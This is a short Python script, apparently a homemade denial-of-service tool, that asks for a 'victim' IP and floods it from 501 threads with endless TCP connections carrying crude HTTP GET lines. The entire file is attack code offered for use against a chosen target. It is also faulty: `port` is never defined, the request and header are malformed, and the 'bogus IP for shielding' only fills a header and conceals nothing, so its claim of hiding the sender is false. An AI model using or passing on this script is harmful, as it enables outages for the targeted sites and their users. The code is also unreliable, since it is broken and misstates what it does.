#!/bin/python3

import threading
import socket

deadboi = input("[!] enter the IP of the victim: ")
notmyip = input("[!] enter a bogus IP for sheilding: ")

def death():
    while True:
        sockboi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sockboi.connect((deadboi, port))
        sockboi.sendto(("GET /" + deadboi + "HTTP/1.1\r\n").encode("ascii"), (deadboi, port))
        sockboi.sendto(("Hosts: " + notmyip + "\r\n\r\n").encode("ascii"), (deadboi, port))
        sockboi.close()
        

for i in range(501):
    threadboi = threading.Thread(target=death)
    threadboi.start()
